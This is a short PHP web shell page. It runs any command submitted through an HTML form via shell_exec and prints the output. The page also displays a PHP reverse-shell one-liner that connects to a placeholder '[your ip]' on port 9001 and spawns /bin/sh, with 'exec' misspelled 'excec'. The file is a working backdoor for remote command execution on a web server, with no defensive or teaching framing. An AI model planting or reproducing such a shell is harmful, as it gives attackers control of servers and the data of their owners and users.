<?php
$command = $_POST['command'];
$output = shell_exec($command);
?>

<html>
<script>
window.onload = function () {
        var current_url = window.location.href;
        document.myform.action = current_url;

}
</script>

<p>hello there </p>                                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
<p>php -r '$sock=fsockopen("[your ip]", 9001);excec("/bin/sh -i <&3>&3 2>&3");'</p>                                                                                                                                                        
<form method="post" name="myform"  action="">                                                                                                                                                                                              
    <input name="command" value="" style="width:500px;">                                                                                                                                                                                   
    <input type="submit" name="run command" value="Run">                                                                                                                                                                                   
</form>                                                                                                                                                                                                                                    
<?php echo "<pre>$output</pre>"; ?>                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
</html> 